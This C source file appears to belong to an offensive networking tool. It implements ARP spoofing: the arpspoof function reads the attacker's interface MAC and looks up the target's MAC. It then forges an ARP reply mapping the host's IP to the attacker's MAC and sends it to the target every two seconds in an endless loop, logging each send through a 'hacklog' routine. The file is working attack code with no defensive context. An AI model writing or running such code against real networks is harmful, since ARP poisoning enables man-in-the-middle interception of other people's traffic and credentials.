#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include "nethack.h"
#include "arp.h"

int mac_from_iface(const char* iface_name, struct ether_addr* ether_out)
{
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) {
		//perror("socket()");
		return -1;
	}

	struct ifreq ifr;
	memset((void*) &ifr, 0, sizeof(ifr));

	strncpy(ifr.ifr_name, iface_name, sizeof(ifr.ifr_name));

	if (ioctl(sock, SIOCGIFHWADDR, (void*) &ifr) < 0) {
		//perror("ioctl()");
		return -1;
	}

	memcpy(ether_out->ether_addr_octet, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	return 1;
}

int arpspoof(char *myip, char *interface, char *target, char *host)
{
	struct ether_addr iface_hwaddr;
	struct ether_addr target_hwaddr;
	struct arp_packet *arp;
	char sendr_mac[18]; /* e.g. 'aa:bb:cc:11:22:33' = 17 chars + \0 = 18 chars */
	char target_mac[18];
	int sock, if_idx;
	int interval;

	interval = 2;
	if (interval < 0)
		interval = 2;

	if (mac_from_iface(interface, &iface_hwaddr) < 0) {
		return -1;
	}

	if (find_mac_addr(inet_addr(target), interface, &target_hwaddr) < 0) {
        //perror("find_mac_addr error");
		return -1;
	}

	memset(sendr_mac, 0, sizeof(sendr_mac));
	memset(target_mac, 0, sizeof(target_mac));

	strncpy(sendr_mac, ether_ntoa(&iface_hwaddr), sizeof(sendr_mac));
	strncpy(target_mac, ether_ntoa(&target_hwaddr), sizeof(target_mac));

	arp = create_arp_reply_packet(sendr_mac, host, target_mac, target);
	
	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) {
		//perror("socket()");
		return -1;
	}

	if_idx = if_nametoindex(interface);
	if (if_idx == 0) {
		//perror("if_nametoindex()");
		return -1;
	}

	//printf("Interval: per %d (sleep)\n", interval);
	while (1) 
	{
		if (send_arp_to(arp, sock, if_idx) > 0) 
		{
			hacklog(myip, "host:%s -> target:%s\n", host, target);
			//printf("send ARP Reply: %s is at %s --to-> %s\n", host, sendr_mac, target);
		}

		sleep(interval);
	}

	return 0;
}
